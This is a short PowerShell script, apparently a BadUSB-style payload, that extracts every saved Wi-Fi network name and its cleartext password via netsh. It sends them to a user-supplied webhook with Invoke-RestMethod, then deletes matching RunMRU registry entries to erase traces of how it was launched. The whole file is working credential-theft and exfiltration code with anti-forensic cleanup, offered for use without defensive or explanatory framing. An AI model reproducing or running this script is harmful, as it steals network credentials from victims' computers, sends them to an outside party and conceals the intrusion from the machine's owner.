# Use this line if you intrested in typing your webhook inside file;
# $WEBHOOK =""





$profiles = netsh wlan show profile |
            Select-String "All User Profile" |
            ForEach-Object {
                ($_ -split ":",2)[1].Trim()
            }

foreach ($PROFILE_NAME in $profiles) {

    $passLine = netsh wlan show profile $PROFILE_NAME key=clear |
                Select-String "Key Content"

    if ($passLine) {
        $PASSWORD = ($passLine -split ":",2)[1].Trim()

        if ($PASSWORD -ne "") {
            $PAYLOAD = @{
    content = "Network: $PROFILE_NAME Password: $PASSWORD"
} | ConvertTo-Json

Invoke-RestMethod -Uri $WEBHOOK `
    -Method Post `
    -ContentType "application/json" `
    -Body $PAYLOAD | Out-Null
        }
        
    }
    
}
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"


$keys = Get-ItemProperty -Path $path | Select-Object -Property * | Get-Member -MemberType NoteProperty | Select-Object -ExpandProperty Name

foreach ($key in $keys) {
 
    if ($key -eq "MRUList") { continue }

  
    $value = (Get-ItemPropertyValue -Path $path -Name $key) -replace "`0",""

    if ($value -match '(?i)powershell\s+$WEBHOOK') {
        Remove-ItemProperty -Path $path -Name $key -ErrorAction SilentlyContinue
    }
}







